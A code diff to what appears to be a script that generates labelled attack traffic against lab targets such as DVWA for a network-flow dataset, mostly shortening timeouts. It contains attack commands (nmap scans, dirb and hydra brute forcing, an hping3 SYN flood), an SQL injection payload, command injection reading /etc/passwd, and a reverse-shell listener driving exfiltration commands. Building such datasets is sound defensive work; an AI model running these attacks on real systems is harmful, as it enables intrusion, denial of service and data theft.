@@ -135,20 +135,22 @@ def attack_cmds(site):
         login_path, fail = "/login", "Invalid"
     base = f"http://{ip}:{port}"
     return {
-        "portscan":      (["nmap", "-sS", "-T3", "-p", "1-10000", ip], 300),
-        # Web-layer scan via nmap HTTP NSE scripts (enumeration + probes).
-        # Uses the already-installed nmap, so no extra toolbox dependency.
-        "web_scan":      (["nmap", "-Pn", "-p", str(port), "--script",
-                           "http-enum,http-headers,http-title,http-methods,"
-                           "http-sql-injection", ip], 300),
-        "dir_bruteforce":(["dirb", f"{base}/", DIRS, "-S", "-r"], 180),
+        # top 200 ports (not 1-10000): still a clear scan, ~50x fewer flows and
+        # finishes in seconds on the LAN -> much faster capture + extraction.
+        "portscan":      (["nmap", "-sS", "-T4", "--top-ports", "200", ip], 90),
+        # Web-layer scan via nmap HTTP NSE (fast enumeration scripts only; the
+        # http-sql-injection crawler was dropped because it was the slow part).
+        "web_scan":      (["nmap", "-Pn", "-T4", "-p", str(port), "--script",
+                           "http-enum,http-headers,http-title,http-methods",
+                           ip], 90),
+        "dir_bruteforce":(["dirb", f"{base}/", DIRS, "-S", "-r"], 90),
         "login_bruteforce":(["hydra", "-s", str(port), "-L", USERS, "-P",
-                             PASSWORDS, "-t", "4", ip, "http-post-form",
-                             f"{login_path}:username=^USER^&password=^PASS^:{fail}"], 240),
-        # shorter, lower-rate flood so it doesn't swamp the flow dataset
-        # (a flood still produces far more flows than other attacks)
-        "syn_flood":     (["timeout", "20", "hping3", "-S", "-p", str(port),
-                           "-i", "u6000", ip], 35),
+                             PASSWORDS, "-t", "8", ip, "http-post-form",
+                             f"{login_path}:username=^USER^&password=^PASS^:{fail}"], 120),
+        # short, low-rate flood: enough to be a clear flood without swamping
+        # the dataset or the student's session
+        "syn_flood":     (["timeout", "12", "hping3", "-S", "-p", str(port),
+                           "-i", "u6000", ip], 25),
     }
 
 
@@ -160,7 +162,7 @@ def attack_phase(sites, rnd):
         cmds = attack_cmds(site)
         for idx, name in enumerate(rnd.sample(sorted(cmds), k=rnd.randint(2, 4))):
             if idx:
-                time.sleep(rnd.uniform(10, 16))   # gap so windows don't overlap
+                time.sleep(rnd.uniform(4, 7))     # small gap so windows don't overlap
             cmd, tmo = cmds[name]
             t0 = now()
             code = run(cmd, timeout=tmo + 30)
@@ -203,7 +205,7 @@ def _dvwa_token(op, url):
         return ""
 
 
-def _shell_listener(result, dwell=12):
+def _shell_listener(result, dwell=5):
     """Listen for the reverse shell, drive a few exfil commands, record it."""
     srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -263,7 +265,7 @@ def exploit_dvwa(site, rnd):
         False, None, True, None, None, {}))
 
     # 2) SQL injection (dumps all users)
-    time.sleep(5)                                  # separate windows
+    time.sleep(2)                                  # separate windows
     t0 = now()
     try:
         payload = urllib.parse.quote("1' OR '1'='1")
@@ -274,7 +276,7 @@ def exploit_dvwa(site, rnd):
     log(site, "sqli", "exploit", t0, now(), code, "success" if code == 0 else "attempt")
 
     # 3) command injection (benign proof: read /etc/passwd)
-    time.sleep(5)
+    time.sleep(2)
     t0 = now()
     try:
         tok = _dvwa_token(op, base + "/vulnerabilities/exec/")
@@ -288,7 +290,7 @@ def exploit_dvwa(site, rnd):
         "success" if code == 0 else "attempt")
 
     # 4) reverse shell + exfil (post-exploitation)
-    time.sleep(5)
+    time.sleep(2)
     result = {}
     lst = threading.Thread(target=_shell_listener, args=(result,), daemon=True)
     lst.start()
@@ -361,7 +363,7 @@ def web_exploit_attempts(site, rnd):
     op, _ = opener()
     for idx, name in enumerate(rnd.sample(sorted(_ATTEMPT_PAYLOADS), k=rnd.randint(2, 4))):
         if idx:
-            time.sleep(rnd.uniform(6, 10))         # separate windows
+            time.sleep(rnd.uniform(3, 5))         # separate windows
         t0 = now()
         for path in _ATTEMPT_PAYLOADS[name]:
             for _ in range(rnd.randint(2, 4)):
